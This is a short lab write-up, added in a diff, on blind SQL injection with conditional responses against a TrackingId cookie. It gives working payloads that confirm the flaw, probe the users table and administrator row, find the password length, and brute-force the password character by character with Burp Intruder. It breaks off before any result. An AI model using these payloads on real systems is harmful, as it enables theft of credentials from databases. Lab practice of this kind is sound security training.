@@ -1,1 +1,29 @@
-#
+# Category: sql-injection Lab: Blind-SQL-injection-with-conditional-responses
+
+#OBJECTIVE get the password of adminisstrator user
+
+#Step 1
+check vulnerability by ('AND 1=1--) in tackingid like -> TrackingId=uQkk4gt7UjJ'and 1=1--
+we get welcome back message  this message does not appear if condition is false
+
+#Step 2
+TrackingId=x' AND (SELECT 'a' FROM users LIMIT 1)='a
+We ensure that users table is found
+
+#Step 3 
+TrackingId=x' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+we ensure from administrator user
+after confirm of that we need password
+I'll use bruteforce  for that after we know the length of password
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
+
+#Step 4
+we do brute force to know password
+TrackingId=x' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$
+on burp suite send request to intruder ,i select 2 positions on for position of character in password & one for password 
+I select numbers for 1st position & brute force for 2nd position 
+I'll show 
+
+
+
+
